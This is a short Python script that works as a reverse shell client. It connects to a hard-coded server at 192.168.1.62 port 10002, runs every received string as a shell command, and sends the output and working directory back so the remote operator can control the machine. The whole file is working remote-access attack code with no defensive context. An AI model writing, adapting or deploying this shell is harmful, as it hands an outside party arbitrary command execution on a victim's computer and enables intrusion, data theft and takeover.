import socket
import os
import subprocess

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

host = "192.168.1.62" # this is the ip adress of the server
port = 10002           # the port id of the server

sock.connect((host, port)) # creating connection to the server

while True:
    data = sock.recv(1024) # reciving the encoded message from the server (the command that is sent be the server)
    if data[:2].decode("utf-8") == "cd": os.chdir(data[3:].decode("utf-8"))
    
    if len(data) > 0:
        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True,             # processing the recived data
                                stdout=subprocess.PIPE, stdin=subprocess.PIPE,
                                stderr=subprocess.PIPE)
        
        output = str((cmd.stdout.read() + cmd.stderr.read()), "utf-8")
        current_directory = os.getcwd() + "> "
        sock.send(str.encode(output + current_directory)) # sending the output of the executed command in the client 
                                                          # computer to the server so the server can get better controle

        #print(output) # if you want to see what is the server doing on your computer uncomment this!